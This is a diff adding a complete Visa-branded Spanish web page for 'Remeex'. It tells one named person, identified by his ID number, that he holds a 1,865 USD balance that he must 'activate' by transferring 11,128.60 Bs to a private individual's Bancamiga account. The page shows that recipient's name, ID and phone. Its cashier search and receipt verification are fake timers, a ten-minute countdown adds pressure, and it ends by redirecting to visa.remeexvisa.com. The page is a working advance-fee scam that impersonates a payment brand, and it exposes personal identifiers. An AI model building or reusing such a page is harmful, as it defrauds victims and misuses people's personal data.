@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Remeex | Planilla de Recarga (Estilo Visa)</title>
+<meta name="description" content="Planilla de recarga virtual P2P estilo Visa para activar cuenta Remeex." />
+<style>
+  :root {
+    /* Paleta de colores Estilo Visa (Fondo Blanco) */
+    --bg: #f4f7fa;
+    --card: #ffffff;
+    --text: #1a1a1a;
+    --muted: #66778d;
+    --border: #dde3ea;
+    --accent: #0057a0;  /* Visa Blue */
+    --accent-light: #e6f0ff;
+    --accent-dark: #003d73;
+    --ok: #16c784;
+    --warn: #ffb020;
+    --danger: #d93025;
+  }
+  
+  * { 
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+  
+  html, body { 
+    height: 100%; 
+  }
+  
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
+  
+  .max {
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 24px;
+  }
+  
+  .nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap; /* Para móviles */
+    gap: 12px;
+    padding: 12px 0;
+    margin-bottom: 16px;
+  }
+  
+  /* Chip de Visa rediseñado */
+  .visa-chip {
+    font-weight: 900;
+    font-style: italic;
+    letter-spacing: .05em;
+    font-size: 1.1rem;
+    padding: .4rem .8rem;
+    border-radius: .5rem;
+    background: #1a1f71; /* Visa Dark Blue */
+    color: #fff;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, .1);
+  }
+  
+  /* Badges y Pills rediseñados */
+  .badge {
+    padding: .35rem .6rem;
+    border-radius: 999px;
+    background: var(--accent-light);
+    color: var(--accent);
+    font-weight: 600;
+    border: 1px solid var(--border);
+    font-size: 0.85rem;
+  }
+  
+  .pill {
+    padding: .35rem .6rem;
+    border-radius: 999px;
+    background: #eef2f7;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    font-weight: 600;
+    font-size: 0.8rem;
+  }
+  
+  /* Tarjetas rediseñadas */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 24px;
+    box-shadow: 0 4px 16px rgba(0, 87, 160, .07);
+  }
+  
+  .grid { 
+    display: grid; 
+    gap: 16px; 
+  }
+  
+  /* Clases responsivas para las columnas */
+  .cols-2-responsive { grid-template-columns: 1.2fr .8fr; }
+  .cols-3-responsive { grid-template-columns: repeat(3, 1fr); }
+  .cols-2-cajero { grid-template-columns: 1fr 1fr; }
+  
+  /* Media query para móviles */
+  @media (max-width: 900px) {
+    .max { padding: 12px; }
+    .nav { justify-content: center; } /* Centrar nav en móvil */
+    .cols-2-responsive { grid-template-columns: 1fr; }
+  }
+  
+  @media (max-width: 600px) {
+    .cols-3-responsive { grid-template-columns: repeat(2, 1fr); } /* 2 cols para datos */
+    .cols-2-cajero { grid-template-columns: 1fr; } /* 1 col para datos cajero */
+  }
+
+  /* Tipografía y elementos */
+  .title { 
+    font-size: 1.35rem; 
+    font-weight: 800; 
+    letter-spacing: .02em; 
+    color: var(--accent-dark);
+  }
+  
+  .step-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    color: var(--text);
+    padding-bottom: 8px;
+    border-bottom: 2px solid var(--accent-light);
+    margin-bottom: 12px;
+  }
+  
+  .muted { color: var(--muted); }
+  .label { 
+    font-size: .8rem; 
+    color: var(--muted); 
+    text-transform: uppercase; 
+    letter-spacing: .09em; 
+    font-weight: 600;
+    display: block; /* Mejor para layout */
+    margin-bottom: 4px;
+  }
+  .value { font-size: 1.05rem; font-weight: 700; }
+  
+  /* Formularios rediseñados */
+  .input, .button, .file {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: var(--card);
+    color: var(--text);
+    outline: none;
+    font-size: 1rem;
+    transition: border .2s ease, box-shadow .2s ease;
+  }
+  
+  .input:focus, .file:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px var(--accent-light);
+  }
+  
+  .button {
+    font-weight: 800;
+    letter-spacing: .04em;
+    cursor: pointer;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    box-shadow: 0 4px 14px rgba(0, 87, 160, .25);
+    transition: transform .1s ease, background-color .2s ease;
+  }
+  
+  .button:hover {
+    background: var(--accent-dark);
+  }
+  .button:active { 
+    transform: translateY(1px); 
+    box-shadow: 0 2px 8px rgba(0, 87, 160, .2);
+  }
+  .button:disabled {
+    background: var(--border);
+    color: var(--muted);
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+  
+  .button.ghost {
+    background: transparent;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    box-shadow: none;
+  }
+  .button.ghost:hover {
+    background: var(--accent-light);
+  }
+  
+  .row { 
+    display: flex; 
+    gap: 12px; 
+    align-items: center; 
+    flex-wrap: wrap; 
+  }
+  
+  .ok { color: var(--ok); }
+  .warn { color: var(--warn); }
+  .danger { color: var(--danger); }
+  
+  .divider { 
+    height: 1px; 
+    background: var(--border);
+    margin: 16px 0; 
+  }
+  
+  /* Animaciones */
+  .spinner {
+    width: 18px;
+    height: 18px;
+    border-radius: 999px;
+    border: 3px solid var(--accent-light);
+    border-top-color: var(--accent);
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  
+  .scan {
+    height: 56px;
+    border-radius: 14px;
+    background: var(--accent-light);
+    border: 1px dashed var(--accent);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 0 16px;
+    color: var(--accent-dark);
+    font-weight: 700;
+  }
+  
+  .progressbar {
+    height: 8px;
+    border-radius: 8px;
+    background: var(--border);
+    overflow: hidden;
+  }
+  .progressbar > div {
+    height: 100%;
+    width: 0%;
+    background: var(--accent);
+    animation: widen 2.2s ease-in-out infinite;
+  }
+  @keyframes widen {
+    0% { width: 0%; }
+    50% { width: 75%; }
+    100% { width: 0%; }
+  }
+  
+  /* Alertas y misceláneos */
+  .toast {
+    position: fixed;
+    right: 16px;
+    bottom: 16px;
+    background: var(--accent-dark);
+    border: 1px solid var(--border);
+    color: #fff;
+    padding: 12px 16px;
+    border-radius: 12px;
+    box-shadow: 0 6px 22px rgba(0, 0, 0, .15);
+    font-weight: 600;
+    z-index: 100;
+  }
+  
+  .hidden { display: none !important; }
+  .center { display: grid; place-items: center; text-align: center; }
+  a.link { 
+    color: var(--accent); 
+    text-decoration: none; 
+    font-weight: 600;
+    border-bottom: 1px solid var(--accent);
+  }
+  a.link:hover {
+    color: var(--accent-dark);
+    border-bottom-color: var(--accent-dark);
+  }
+
+  /* Espaciadores */
+  .spacer-sm { height: 10px; }
+  .spacer-md { height: 16px; }
+
+</style>
+</head>
+<body>
+  <div class="max">
+    <header class="nav">
+      <div class="row">
+        <div class="visa-chip">VISA</div>
+        <span class="badge">Remeex · P2P</span>
+      </div>
+      <div class="row">
+        <span class="pill">Seguro <span class="ok">●</span></span>
+        <span class="pill">Cajeros verificados</span>
+      </div>
+    </header>
+
+    <section id="view-login" class="grid" aria-label="Inicio de sesión">
+      <div class="card">
+        <div class="title">Inicia sesión para recargar</div>
+        <p class="muted">Introduce tu Cédula de Identidad para continuar.</p>
+        <div class="divider"></div>
+        <label class="label" for="cedula">Cédula de Identidad</label>
+        <input id="cedula" class="input" inputmode="numeric" pattern="[0-9]*" placeholder="Ej: 27303158" />
+        <div class="spacer-sm"></div>
+        <button id="btnLogin" class="button">Acceder</button>
+        <div id="loginError" class="muted danger" style="margin-top:10px;display:none">Cédula incorrecta. Verifica e intenta nuevamente.</div>
+        <div class="row" style="margin-top:14px">
+          <small class="muted">Este es un sistema P2P. Nunca compartas códigos de un solo uso.</small>
+        </div>
+      </div>
+    </section>
+
+    <section id="view-scan" class="grid hidden" aria-label="Búsqueda de cajero">
+      <div class="card">
+        <div class="title">Buscando operador / cajero verificado Remeex</div>
+        <p class="muted">Estamos localizando un cajero disponible y verificado para tu primera recarga…</p>
+        <div class="divider"></div>
+        <div class="scan">
+          <div class="spinner" aria-hidden="true"></div>
+          <span>Remeex · Red segura</span>
+        </div>
+        <div class="divider"></div>
+        <div class="progressbar" aria-label="Progreso de búsqueda"><div></div></div>
+        <div class="row" style="margin-top:10px">
+          <span class="pill">Verificación KYC</span>
+          <span class="pill">Reputación 5★</span>
+          <span class="pill">Tiempo estimado &lt; 10s</span>
+        </div>
+      </div>
+    </section>
+
+    <section id="view-reload" class="grid cols-2-responsive hidden" aria-label="Planilla de recarga">
+      
+      <div class="card">
+        <div class="row" style="justify-content:space-between">
+          <div class="title">Hola, <span id="nombreUsuario">Isacc Manuel Rivero Chirino</span></div>
+          <span class="badge">Perfil verificado</span>
+        </div>
+        <p class="muted">Tu recarga activará tu cuenta y se <strong>sumará</strong> a tu saldo disponible.</p>
+        <div class="divider"></div>
+
+        <div class="grid cols-3-responsive">
+          <div>
+            <div class="label">Cédula</div>
+            <div class="value" id="cedulaOut">27.303.158</div>
+          </div>
+          <div>
+            <div class="label">Saldo actual</div>
+            <div class="value" id="saldoActual">1.865,00 USD</div>
+          </div>
+          <div>
+            <div class="label">Recarga</div>
+            <div class="value" id="montoRecarga">35,00 USD</div>
+          </div>
+          <div>
+            <div class="label">Tasa</div>
+            <div class="value" id="tasa">317,96 Bs/USD</div>
+          </div>
+          <div>
+            <div class="label">Equivalente</div>
+            <div class="value" id="equivalenteBs">11.128,60 Bs</div>
+          </div>
+          <div>
+            <div class="label">Nuevo saldo estimado</div>
+            <div class="value ok" id="nuevoSaldo">1.900,00 USD</div>
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="row">
+          <span class="pill">Recarga P2P</span>
+          <span class="pill">Fondos se acreditan tras verificación</span>
+        </div>
+      </div>
+
+      <div class="card">
+        
+        <div class="step-title">Paso 1: Realiza la transferencia</div>
+        <p class="muted" style="margin-bottom: 12px;">Transfiere desde tu <strong>Banco de Venezuela</strong> (asociado a tu C.I.) a la siguiente cuenta:</p>
+
+        <div class="grid cols-2-cajero">
+          <div>
+            <div class="label">Titular</div>
+            <div class="value">Maria Alejandra Belandria Perez</div>
+          </div>
+          <div>
+            <div class="label">Cédula</div>
+            <div class="value">V-20.639.785</div>
+          </div>
+          <div>
+            <div class="label">Teléfono</div>
+            <div class="value">0414-4272486</div>
+          </div>
+          <div>
+            <div class="label">Banco destino</div>
+            <div class="value">Bancamiga</div>
+          </div>
+          <div>
+            <div class="label">Monto a transferir (Bs)</div>
+            <div class="value" id="montoBs">11.128,60 Bs</div>
+          </div>
+          <div>
+            <div class="label">Concepto / Descripción</div>
+            <div class="value" id="concepto">27303158 Bs</div>
+          </div>
+        </div>
+        
+        <div class="divider"></div>
+
+        <div id="timerWrap" class="card" style="background:var(--bg); border-style: dashed;">
+          <div class="row" style="justify-content:space-between">
+            <div class="row" style="gap:10px">
+              <div class="spinner" aria-hidden="true"></div>
+              <strong>Reserva de cajero activa</strong>
+            </div>
+            <div>
+              <span class="label" style="margin:0;">Tiempo restante</span>
+              <div id="countdown" class="value warn">10:00</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="spacer-md"></div>
+
+        <div class="step-title">Paso 2: Adjunta el comprobante</div>
+        <label class="label" for="comprobante">Sube el comprobante (PDF/JPG/PNG)</label>
+        <input id="comprobante" class="file" type="file" accept=".pdf,.jpg,.jpeg,.png" />
+        <div class="spacer-sm"></div>
+        <button id="btnEnviar" class="button" disabled>Enviar comprobante</button>
+        <div class="spacer-sm"></div>
+        <button id="btnCancelar" class="button ghost">Cancelar</button>
+        <div class="spacer-sm"></div>
+        <small class="muted">Al adjuntar, el sistema analizará el comprobante y acreditará tu recarga al saldo existente.</small>
+      </div>
+    </section>
+
+    <section id="view-analyzing" class="grid hidden" aria-label="Analizando comprobante">
+      <div class="card center" style="min-height:260px">
+        <div class="spinner" style="width:34px;height:34px;border-width:4px"></div>
+        <div class="spacer-sm"></div>
+        <div class="title">Analizando tu comprobante…</div>
+        <p class="muted">Verificando origen (Banco de Venezuela), monto y concepto. No cierres esta ventana.</p>
+        <div class="divider"></div>
+        <div class="progressbar" aria-label="Progreso de verificación"><div></div></div>
+      </div>
+    </section>
+
+    <section id="view-redirect" class="grid hidden" aria-label="Redirección">
+      <div class="card center" style="min-height:220px">
+        <div class="title">¡Listo! Redirigiendo a tu cuenta…</div>
+        <p class="muted">Serás llevado a <a class="link" href="https://visa.remeexvisa.com/accesoamicuenta">visa.remeexvisa.com/accesoamicuenta</a></p>
+        <div class="spacer-md"></div>
+        <button class="button" onclick="window.location.href='https://visa.remeexvisa.com/accesoamicuenta'">Ir ahora</button>
+      </div>
+    </section>
+  </div>
+
+  <div id="toast" class="toast hidden">El saldo se sumará al que ya tienes en la aplicación.</div>
+
+<script>
+  // ======= Datos base =======
+  const PROFILE = {
+    nombre: "Isacc Manuel Rivero Chirino",
+    cedula: "27303158",
+    saldoUSD: 1865.00,
+    recargaUSD: 35.00,
+    tasa: 317.96 // Bs/USD
+  };
+
+  // ======= Utilidades de formato =======
+  const fmtVE = new Intl.NumberFormat('es-VE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  const formatUSD = v => fmtVE.format(v) + " USD";
+  const formatBs  = v => fmtVE.format(v).replace(/\./g, '#').replace(/,/g, '.').replace(/#/g, ',') + " Bs";
+  // (El truco anterior fuerza miles con punto y decimales con coma, por si el navegador cambia el locale)
+  const formatCedula = v => v.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Regex corregido
+
+  // ======= Elementos del DOM =======
+  const viewLogin = document.getElementById('view-login');
+  const viewScan = document.getElementById('view-scan');
+  const viewReload = document.getElementById('view-reload');
+  const viewAnalyzing = document.getElementById('view-analyzing');
+  const viewRedirect = document.getElementById('view-redirect');
+  const cedulaInput = document.getElementById('cedula');
+  const btnLogin = document.getElementById('btnLogin');
+  const loginError = document.getElementById('loginError');
+
+  const nombreUsuario = document.getElementById('nombreUsuario');
+  const cedulaOut = document.getElementById('cedulaOut');
+  const saldoActual = document.getElementById('saldoActual');
+  const montoRecarga = document.getElementById('montoRecarga');
+  const tasa = document.getElementById('tasa');
+  const equivalenteBs = document.getElementById('equivalenteBs');
+  const nuevoSaldo = document.getElementById('nuevoSaldo');
+  const montoBs = document.getElementById('montoBs');
+  const concepto = document.getElementById('concepto');
+
+  const countdown = document.getElementById('countdown');
+  const btnEnviar = document.getElementById('btnEnviar');
+  const btnCancelar = document.getElementById('btnCancelar');
+  const comp = document.getElementById('comprobante');
+
+  const toast = document.getElementById('toast');
+
+  // ======= Estado =======
+  let timerId = null;
+  let endTime = null;
+
+  function show(el){ el.classList.remove('hidden'); }
+  function hide(el){ el.classList.add('hidden'); }
+
+  function showToast(){
+    toast.classList.remove('hidden');
+    setTimeout(()=>toast.classList.add('hidden'), 3500);
+  }
+
+  // ======= Login =======
+  btnLogin.addEventListener('click', () => {
+    const value = (cedulaInput.value || '').replace(/\D/g,'');
+    if(value === PROFILE.cedula){
+      loginError.style.display = 'none';
+      hide(viewLogin);
+      show(viewScan);
+      // Simula búsqueda 1.3s
+      setTimeout(()=>{
+        hide(viewScan);
+        prepareReloadView();
+        show(viewReload);
+        showToast();
+        startCountdown(10*60); // 10 minutos
+      }, 1300);
+    } else {
+      loginError.style.display = 'block';
+    }
+  });
+
+  // Enter para login
+  cedulaInput.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') btnLogin.click(); });
+
+  // ======= Vista de recarga =======
+  function prepareReloadView(){
+    const eqBs = PROFILE.recargaUSD * PROFILE.tasa;
+    const nuevo = PROFILE.saldoUSD + PROFILE.recargaUSD;
+
+    nombreUsuario.textContent = PROFILE.nombre;
+    cedulaOut.textContent = formatCedula(PROFILE.cedula); // Regex corregido
+    saldoActual.textContent = formatUSD(PROFILE.saldoUSD);
+    montoRecarga.textContent = formatUSD(PROFILE.recargaUSD);
+    tasa.textContent = fmtVE.format(PROFILE.tasa).replace(/\./g, '#').replace(/,/g, '.').replace(/#/g, ',') + " Bs/USD";
+    equivalenteBs.textContent = formatBs(eqBs);
+    montoBs.textContent = formatBs(eqBs);
+    nuevoSaldo.textContent = formatUSD(nuevo);
+    concepto.textContent = PROFILE.cedula + " Bs";
+    
+    // Resetear estado del botón y timer
+    countdown.classList.remove('danger');
+    countdown.classList.add('warn');
+    comp.value = "";
+    btnEnviar.disabled = true;
+  }
+
+  // ======= Countdown 10:00 =======
+  function startCountdown(seconds){
+    if(timerId) clearInterval(timerId); // Limpiar timer anterior si existe
+    endTime = Date.now() + seconds*1000;
+    updateCountdown();
+    timerId = setInterval(updateCountdown, 250);
+  }
+
+  function updateCountdown(){
+    const remaining = Math.max(0, Math.floor((endTime - Date.now())/1000));
+    const m = String(Math.floor(remaining/60)).padStart(2,'0');
+    const s = String(remaining%60).padStart(2,'0');
+    countdown.textContent = `${m}:${s}`;
+    
+    if (remaining <= 120 && remaining > 0) { // Menos de 2 min
+        countdown.classList.remove('warn');
+        countdown.classList.add('danger');
+    } else if(remaining <= 0){
+      clearInterval(timerId);
+      countdown.textContent = "00:00";
+      countdown.classList.remove('warn');
+      countdown.classList.add('danger');
+      btnEnviar.disabled = true;
+      document.getElementById('timerWrap').style.borderColor = "var(--danger)";
+    }
+  }
+
+  // ======= Adjuntar Comprobante =======
+  comp.addEventListener('change', ()=>{
+    const remaining = Math.max(0, Math.floor((endTime - Date.now())/1000));
+    btnEnviar.disabled = !comp.files.length || remaining <= 0;
+  });
+
+  btnEnviar.addEventListener('click', ()=>{
+    if(!comp.files.length) return;
+    hide(viewReload);
+    show(viewAnalyzing);
+    if(timerId) clearInterval(timerId); // Detener timer
+    
+    // Simula análisis 2.2s y redirige
+    setTimeout(()=>{
+      hide(viewAnalyzing);
+      show(viewRedirect);
+      // Redirección automática tras breve pausa
+      setTimeout(()=>{
+        window.location.href = "https://visa.remeexvisa.com/accesoamicuenta";
+      }, 1200);
+    }, 2200);
+  });
+
+  btnCancelar.addEventListener('click', ()=>{
+    // Reinicia flujo
+    hide(viewReload);
+    show(viewLogin);
+    cedulaInput.value = "";
+    comp.value = "";
+    btnEnviar.disabled = true;
+    if(timerId) clearInterval(timerId);
+    cedulaInput.focus();
+  });
+
+  // Accesibilidad ligera para foco inicial
+  window.addEventListener('load', ()=>{ cedulaInput.focus(); });
+</script>
+</body>
+</html>
